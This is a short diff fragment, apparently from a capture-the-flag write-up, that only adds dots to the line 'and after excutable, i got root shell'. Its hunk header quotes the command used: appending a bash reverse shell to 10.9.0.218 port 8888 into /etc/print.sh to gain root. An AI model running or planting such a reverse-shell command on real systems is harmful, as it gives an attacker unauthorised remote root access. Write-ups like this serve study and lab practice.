@@ -60,4 +60,4 @@ echo "bash -i >& /dev/tcp/10.9.0.218/8888 0>&1" >> /etc/print.sh
 
 ```
 
-and after excutable, i got root shell
+and after excutable, i got root shell.............
